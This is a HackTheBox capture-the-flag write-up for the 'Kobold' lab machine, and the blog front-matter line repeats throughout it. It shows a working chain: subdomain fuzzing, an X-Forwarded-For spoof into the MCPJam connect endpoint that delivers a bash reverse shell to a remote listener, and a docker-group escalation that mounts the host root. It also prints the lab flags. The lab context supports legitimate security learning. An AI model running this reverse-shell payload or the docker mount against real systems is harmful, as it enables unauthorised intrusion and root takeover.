---
published: false
layout: post
title: "HTB - Kobold"
date: 2026-03-28
categories: [HackTheBox, Easy]
tags: [linux, cve-2026-23744, mcpjam, rce, docker, privesc, x-forwarded-for]
---
published: false

# HTB - Kobold

**Difficulty:** Easy  
**OS:** Linux  
**IP:** 10.129.245.50

---
published: false

## Reconnaissance
```bash
nmap -sV -sC 10.129.245.50
```

![nmap](/assets/images/kobold/Capture_d'écran_2026-03-26_194729.png)

Three services found:
- `22/tcp` — OpenSSH 9.6p1
- `80/tcp` — nginx 1.24.0 (redirects to `https://kobold.htb`)
- `443/tcp` — nginx 1.24.0, SSL cert reveals `DNS:kobold.htb, DNS:*.kobold.htb`

The wildcard SAN `*.kobold.htb` strongly suggests virtual host routing — multiple subdomains are likely in use.

---
published: false

## /etc/hosts
```
10.129.245.50   kobold.htb bin.kobold.htb mcp.kobold.htb
```

![hosts](/assets/images/kobold/Capture_d'écran_2026-03-26_190115.png)
---
published: false

## Subdomain Enumeration

Before running ffuf, I determined the default response size for non-existent subdomains:
```bash
curl -sk https://kobold.htb -H "Host: random.kobold.htb" -o /dev/null -w "%{size_download}\n"
# Output: 154
```

The server returns a 302 redirect of 154 bytes for any non-existent subdomain (catch-all). Using `-fs 154` filters out this noise:
```bash
ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u https://kobold.htb \
  -H "Host: FUZZ.kobold.htb" \
  -fs 154 -k
```

![curl-size](/assets/images/kobold/Capture_d'écran_2026-03-26_194706.png)

![ffuf](/assets/images/kobold/Capture_d'écran_2026-03-26_190207.png)

Two subdomains discovered:
- `mcp.kobold.htb` — MCPJam Inspector
- `bin.kobold.htb` — PrivateBin

---
published: false

## Initial Access — CVE-2026-23744 (MCPJam RCE)

Browsing to `https://mcp.kobold.htb` reveals **MCPJam Inspector v1.4.2**.

![mcpjam](/assets/images/kobold/Capture_d'écran_2026-03-26_194919.png)

Versions <= 1.4.2 are vulnerable to **GHSA-232v-j27c-5pp6**, an unauthenticated RCE via the `/api/mcp/connect` endpoint. The MCPJam process binds to `0.0.0.0` but nginx proxies it from `127.0.0.1:6274`, filtering external requests.

![advisory](/assets/images/kobold/Capture_d'écran_2026-03-26_194944.png)

A direct request without the header is blocked:
```bash
curl http://mcp.kobold.htb/api/mcp/connect
# 301 Moved Permanently
```

![301](/assets/images/kobold/Capture_d'écran_2026-03-26_195053.png)

nginx trusts the `X-Forwarded-For` header without validating its source. By forging `X-Forwarded-For: 127.0.0.1`, the application believes the request comes from localhost and accepts it:
```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1"
```

![poc](/assets/images/kobold/Capture_d'écran_2026-03-26_195234.png)

The endpoint responds — confirming the bypass works. Now sending the reverse shell payload:
```bash
nc -lvnp 4444
```
```bash
curl -sk https://mcp.kobold.htb/api/mcp/connect \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: 127.0.0.1" \
  -d '{
    "serverConfig": {
      "command": "bash",
      "args": ["-c", "bash -i >& /dev/tcp/10.10.15.160/4444 0>&1"],
      "env": {}
    },
    "serverId": "pwn"
  }'
```

![rce](/assets/images/kobold/Capture_d'écran_2026-03-26_195329.png)

![shell](/assets/images/kobold/Capture_d'écran_2026-03-26_195341.png)

Shell received as `ben`.

---
published: false

## User Flag
```bash
id
cat /home/ben/user.txt
```

![user](/assets/images/kobold/Capture_d'écran_2026-03-26_195646.png)
```
0106a292beb32f2a96001fb11f8c3a04
```

---
published: false

## Privilege Escalation

### Enumeration
```bash
cat /etc/group | grep docker
# docker:x:111:alice
```

`ben` is not listed in the docker group in `/etc/group`. However, running `newgrp docker` succeeds without a password:
```bash
newgrp docker
id
# uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
```

This works because of an inconsistency between `/etc/group` and `/etc/gshadow`. The `/etc/gshadow` file (not readable by regular users) contains an entry granting members of the `operator` group access to the `docker` group without a password. This is a classic misconfiguration.

### Docker Group = Root

Being in the `docker` group means full access to the Docker daemon, which runs as root. Any user who can talk to Docker can become root.
```bash
docker images
```

The image `privatebin/nginx-fpm-alpine:2.0.2` is already present locally.

### Container Escape

By mounting the host filesystem (`/`) into the container and running as root, we can read any file on the host:
```bash
docker run -v /:/hostfs --rm --entrypoint cat --user root \
  privatebin/nginx-fpm-alpine:2.0.2 /hostfs/root/root.txt
```

`--entrypoint cat` replaces the container's default entrypoint with `cat`, passing `/hostfs/root/root.txt` directly as argument. The `-v /:/hostfs` mounts the entire host filesystem into `/hostfs` inside the container.

![root](/assets/images/kobold/Capture_d'écran_2026-03-26_201054.png)
```
f51ad850beb18da0064b782e6fb7a7c3
```

---
published: false

## Summary

| Step | Technique |
|------|-----------|
| Recon | nmap, ffuf subdomain enumeration |
| Bypass | X-Forwarded-For header forgery |
| Foothold | CVE-2026-23744 — MCPJam RCE via `/api/mcp/connect` |
| PrivEsc | `/etc/gshadow` inconsistency → docker group → container filesystem mount |

---
published: false

## Attack Chain
```
nmap → ffuf (fs 154) → mcp.kobold.htb
→ CVE-2026-23744 + X-Forwarded-For: 127.0.0.1
→ shell as ben
→ newgrp docker (/etc/gshadow misconfiguration)
→ docker run -v /:/hostfs
→ root.txt
```